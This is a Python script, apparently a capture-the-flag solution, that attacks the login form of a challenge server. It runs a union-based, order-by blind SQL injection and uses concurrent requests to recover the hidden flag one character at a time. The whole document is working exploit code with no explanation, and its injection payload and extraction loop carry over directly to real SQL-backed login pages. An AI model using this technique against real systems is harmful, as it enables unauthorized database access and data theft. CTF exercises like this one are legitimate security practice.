import requests, time
from concurrent.futures import ThreadPoolExecutor

url = "http://challenge.alguien.site:31337/login"
success = "Nice, you are logged in! But... Where is the flag?"
failed = "Sorry, your username or password is bad"
username = "admin"
password = "123456"

def check_flag(i):
	character = chr(i)
	payload = "admin' union select 0,'x','y','" + flag + character + "' order by 4,1 --"
	req = requests.post(url, data={"username": payload, "password": password})
	if success in req.text:
		return chr(i-1)

def concurrent_reqs():
	letter = []
	with ThreadPoolExecutor() as executor:
		try:
			threads = executor.map(check_flag,range(33,127))
			for l in threads:
				if l is not None:
					letter.append(l)
					executor.shutdown(cancel_futures=True)
		except:
			pass		
	return letter[0]

def get_flag():
	global flag
	flag = ""
	while "}" not in flag:
		flag += concurrent_reqs()
		print (flag, end="\r", flush=True)
	return flag

if __name__ == '__main__':
	start = time.perf_counter()
	print ("Getting the flag...")
	print (get_flag())
	stop = time.perf_counter()
	print(f"Cracking time - {round(stop - start, 2)} second(s).")
